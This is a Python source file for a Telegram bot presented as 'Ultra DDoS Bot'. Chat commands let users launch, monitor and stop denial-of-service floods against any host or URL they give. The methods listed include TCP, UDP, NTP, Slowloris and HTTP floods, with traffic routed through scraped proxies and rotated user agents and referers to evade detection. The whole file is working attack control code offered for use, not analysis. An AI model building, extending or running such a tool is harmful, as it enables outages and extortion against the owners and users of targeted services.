import telebot
import asyncio
from threading import Thread
import socket
from time import time, sleep
from proxy_manager import ProxyManager
from attack_methods import Layer4Attack, Layer7Attack
import json
import logging
import psutil
from utils import humanbytes, format_time

logging.basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s', level=logging.INFO)
logger = logging.getLogger("DDoSBot")

with open("config.json", "r") as f:
    config = json.load(f)

bot = telebot.TeleBot(config["telegram_token"])
attacks = {}
proxies = set()
message_ids = {}
referers = []
user_agents = []

async def load_proxies():
    global proxies
    pm = ProxyManager(config["proxy_sources"], config["proxy_file"])
    proxies = await pm.gather_proxies()

def load_referers_and_user_agents():
    global referers, user_agents
    try:
        with open(config["referers_file"], "r") as f:
            referers = [line.strip() for line in f if line.strip()]
        logger.info(f"Loaded {len(referers)} referers.")
    except FileNotFoundError:
        logger.error(f"Referers file {config['referers_file']} not found. Using default.")
        referers = ["https://www.google.com/"]

    try:
        with open(config["user_agents_file"], "r") as f:
            user_agents = [line.strip() for line in f if line.strip()]
        logger.info(f"Loaded {len(user_agents)} user agents.")
    except FileNotFoundError:
        logger.error(f"User agents file {config['user_agents_file']} not found. Using default.")
        user_agents = ["Mozilla/5.0"]

SPINNER = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
spinner_idx = 0

def format_status(attack):
    global spinner_idx
    spinner = SPINNER[spinner_idx % len(SPINNER)]
    spinner_idx += 1
    elapsed_time = time() - attack.start_time if attack.start_time else 0
    remaining_time = max(0, attack.duration - elapsed_time)
    return (
        f"🔥 *Attack Status* {spinner} 🔥\n"
        f"🎯 *Target*: `{attack.target}`\n"
        f"⚙️ *Method*: `{attack.method}`\n"
        f"⏳ *Elapsed Time*: `{format_time(elapsed_time)}`\n"
        f"⏰ *Remaining Time*: `{format_time(remaining_time)}`\n"
        f"📤 *Bytes Sent*: `{humanbytes(attack.bytes_sent)}`\n"
        f"📦 *Requests Sent*: `{attack.requests_sent}`\n"
        f"🚀 *PPS*: `{attack.requests_sent // max(1, int(elapsed_time))}`/s\n"
        f"📊 *BPS*: `{humanbytes(attack.bytes_sent // max(1, int(elapsed_time)))}`/s\n"
        f"🖥️ *CPU Usage*: `{psutil.cpu_percent()}%`\n"
        f"💾 *Memory Usage*: `{psutil.virtual_memory().percent}%`\n"
        f"🔗 *Proxies*: `{len(proxies)}`"
    )

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, (
        "🌟 *Ultra DDoS Bot* 🌟\n"
        "🔧 *Commands*:\n"
        "  `/attack <method> <target> [duration]` - Start attack\n"
        "  `/stop` - Stop attack\n"
        "  `/proxies` - Check proxies\n"
        "💡 *Supported Methods*: TCP, UDP, NTP, SLOWLORIS, GET, POST, HTTP2, CFB, FLOOD"
    ), parse_mode="Markdown")

@bot.message_handler(commands=['attack'])
def attack(message):
    global proxies, referers, user_agents
    args = message.text.split()[1:]
    if len(args) < 2:
        bot.reply_to(message, "❌ *Usage*: `/attack <method> <target> [duration]`", parse_mode="Markdown")
        return

    method, target = args[0], args[1]
    duration = int(args[2]) if len(args) > 2 else config["default_duration"]

    if psutil.cpu_percent() > config["max_cpu_usage"]:
        bot.reply_to(message, "⚠️ *CPU usage too high, try again later!*", parse_mode="Markdown")
        return

    try:
        if "http" in target.lower():
            attack = Layer7Attack(target, method, proxies, config["default_threads"], duration, referers, user_agents)
        else:
            if ":" not in target:
                target += ":80"
            host, port = target.split(":")
            socket.gethostbyname(host)
            attack = Layer4Attack(host + ":" + port, method, proxies, config["default_threads"], duration, referers, user_agents)

        msg = bot.reply_to(message, (
            f"✅ *Attack Launched* ✅\n"
            f"🎯 *Target*: `{target}`\n"
            f"⚙️ *Method*: `{method}`\n"
            f"⏳ *Duration*: `{format_time(duration)}`\n"
            f"🧵 *Threads*: `{attack.threads}`"
        ), parse_mode="Markdown")
        message_ids[message.chat.id] = msg.message_id

        asyncio.create_task(attack.run())
        attacks[message.chat.id] = attack

        def update_status():
            while attack.running:
                try:
                    bot.edit_message_text(format_status(attack), chat_id=message.chat.id, 
                                        message_id=message_ids[message.chat.id], parse_mode="Markdown")
                except:
                    pass
                sleep(1)
            bot.edit_message_text(f"🛑 *Attack Stopped* 🛑\n📊 *Final Report*:\n{format_status(attack)}",
                                chat_id=message.chat.id, message_id=message_ids[message.chat.id], parse_mode="Markdown")

        Thread(target=update_status, daemon=True).start()
    except Exception as e:
        bot.reply_to(message, f"❌ *Error*: `{str(e)}`", parse_mode="Markdown")

@bot.message_handler(commands=['stop'])
def stop(message):
    if message.chat.id in attacks:
        attacks[message.chat.id].running = False
        del attacks[message.chat.id]
    else:
        bot.reply_to(message, "⚠️ *No active attack found!*", parse_mode="Markdown")

@bot.message_handler(commands=['proxies'])
def proxies_cmd(message):
    global proxies
    if not proxies:
        asyncio.run(load_proxies())
    bot.reply_to(message, f"🔗 *Working Proxies*: `{len(proxies)}`", parse_mode="Markdown")

async def main():
    await load_proxies()
    load_referers_and_user_agents()
    logger.info("Bot started.")
    bot.polling(none_stop=True)

if __name__ == "__main__":
    asyncio.run(main())